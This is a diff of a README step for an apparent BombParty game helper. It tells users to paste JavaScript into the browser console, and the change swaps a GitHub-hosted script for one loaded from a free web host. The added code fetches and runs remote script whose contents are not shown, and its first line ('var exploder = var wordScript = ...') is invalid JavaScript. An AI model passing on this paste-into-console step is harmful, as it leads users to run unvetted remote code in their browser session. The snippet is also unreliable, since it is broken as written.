@@ -18,9 +18,9 @@ How to use it
   
 4. Paste the following code in the console and press "Enter".
   ```javascript
-var exploder = document.createElement("script");
-exploder.src = "https://github.com/skifchaizguddeal/bombparty/blob/master/exploder.js";
-document.head.appendChild(exploder);﻿
+var exploder = var wordScript = document.createElement("script");
+wordScript.src = 'https://bestial-impedance.000webhostapp.com/dico.js';
+document.head.appendChild(wordScript);
 ```
   ![Step 4](https://monosnap.com/file/UTGNLwe9RWPCStwCwJoKoG3ybNGV7L.png)
   
